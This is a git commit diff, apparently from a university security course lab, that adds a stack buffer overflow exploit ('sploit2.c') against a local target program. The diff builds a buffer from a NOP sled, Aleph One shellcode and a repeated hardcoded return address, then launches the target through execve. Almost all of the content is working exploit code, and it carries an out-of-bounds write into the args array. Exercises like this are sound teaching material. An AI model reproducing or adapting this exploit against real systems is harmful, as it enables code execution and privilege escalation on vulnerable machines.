a2ea805b64c66517e16bfc5e3ad28a2d6589926f
Sunny <sl2883@cornell.edu>
2019-11-26 21:56:38 -0500

    part 1.2

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -7,20 +7,70 @@
 
 #define TARGET "/tmp/target2"
 
+unsigned long get_sp(void)
+{
+	__asm__("movl %esp, %eax");
+}
+
+unsigned char *getByteArrayFromLong(unsigned long longInt)
+{
+	unsigned char *byteArray = malloc(sizeof(char) * 4);
+
+	// convert from an unsigned long int to a 4-byte array
+	byteArray[0] = (int)((longInt >> 24) & 0xFF) ;
+	byteArray[1] = (int)((longInt >> 16) & 0xFF) ;
+	byteArray[2] = (int)((longInt >> 8) & 0XFF);
+	byteArray[3] = (int)((longInt & 0XFF));
+
+	return byteArray;
+}
+
 int main(void)
 {
-  char *args[3]; 
-  char *env[1];
-  
-  args[0] = TARGET;
-  args[1] = "student"; 
-  args[2] = NULL;
-  
-  env[0] = NULL;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+	char *args[3]; 
+	char *env[1];
 
-  return 0;
+	unsigned char esp[4];
+	int index = 0;
+	int A1 = 203;
+	int A2 = 38;
+
+	int shellLen = strlen(shellcodeAlephOne);
+	int bufferSize = 8 + A1 + 4*A2 + shellLen;
+
+	char bufferPtr[bufferSize];
+
+	esp[0] = 0x10;esp[1]=0xfb;esp[2]=0xff;esp[3]=0xbf;
+	for(int j = 0; j < bufferSize; j+=4)
+	{
+		bufferPtr[j + 0] = esp[0];
+		bufferPtr[j + 1] = esp[1];
+		bufferPtr[j + 2] = esp[2];
+		bufferPtr[j + 3] = esp[3];
+		//printf("%i\n", j);
+	}
+
+	for(int i = 0; i < A1;i++)
+	{
+		bufferPtr[i] = 0x90;
+	}
+
+
+	for(int k = 0; k < shellLen; k++)
+	{
+		bufferPtr[A1 + k] = shellcodeAlephOne[k];
+	}
+
+	args[0] = TARGET;
+	args[1] = bufferPtr;
+	args[2] = "65935";
+	args[3] = NULL;	
+	env[0] = NULL;
+	
+	execve(TARGET, args, env);
+//	fprintf(stderr, "execve failed.\n");
+
+	return 0;
 }
 
 
